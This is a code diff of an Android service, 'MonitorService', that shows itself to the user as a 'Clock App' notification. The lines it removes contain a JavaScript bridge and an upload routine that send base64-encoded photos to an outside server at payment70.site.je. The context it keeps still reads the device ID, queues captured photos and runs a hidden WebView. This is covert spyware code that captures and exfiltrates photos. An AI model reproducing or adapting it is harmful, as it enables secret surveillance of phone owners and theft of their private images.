@@ -14,7 +14,7 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.provider.Settings
-import android.webkit.JavascriptInterface
+import android.util.Base64
 import android.webkit.WebChromeClient
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -24,7 +24,6 @@ import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
 import java.net.URLEncoder
-import android.util.Base64
 
 class MonitorService : Service() {
 
@@ -70,6 +69,7 @@ class MonitorService : Service() {
                 .setOngoing(true)
                 .build()
         } else {
+            @Suppress("DEPRECATION")
             Notification.Builder(this)
                 .setContentTitle("Clock App")
                 .setContentText("Running")
@@ -84,13 +84,8 @@ class MonitorService : Service() {
             settings.javaScriptEnabled = true
             settings.domStorageEnabled = true
             settings.mediaPlaybackRequiresUserGesture = false
-            settings.allowFileAccess = true
-            settings.allowContentAccess = true
-
             webViewClient = object : WebViewClient() {}
             webChromeClient = object : WebChromeClient() {}
-
-            addJavascriptInterface(JsBridge(), "Native")
         }
 
         val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
@@ -142,51 +137,6 @@ class MonitorService : Service() {
                     pendingPhotos.add(file)
                 }
             }
-        }.start()
-    }
-
-    inner class JsBridge {
-        @JavascriptInterface
-        fun onResult(text: String) {}
-
-        @JavascriptInterface
-        fun onCommand(text: String) {}
-
-        @JavascriptInterface
-        fun saveOfflinePhoto(b64: String) {
-            try {
-                if (isOnline) {
-                    uploadDirect(b64)
-                } else {
-                    val file = File(cacheDir, "offline_${System.currentTimeMillis()}.jpg")
-                    FileOutputStream(file).use {
-                        it.write(Base64.decode(b64, Base64.DEFAULT))
-                    }
-                    pendingPhotos.add(file)
-                }
-            } catch (e: Exception) {}
-        }
-
-        @JavascriptInterface
-        fun isOnline(): Boolean = isOnline
-    }
-
-    private fun uploadDirect(b64: String) {
-        Thread {
-            try {
-                val json = """{"image":"$b64","name":"photo_${System.currentTimeMillis()}.jpg"}"""
-                val url = URL("https://payment70.site.je/upload.php")
-                val conn = url.openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.doOutput = true
-                conn.setRequestProperty("Content-Type", "application/json")
-                OutputStreamWriter(conn.outputStream).use {
-                    it.write(json)
-                    it.flush()
-                }
-                conn.responseCode
-                conn.disconnect()
-            } catch (e: Exception) {}
         }.start()
     }
 
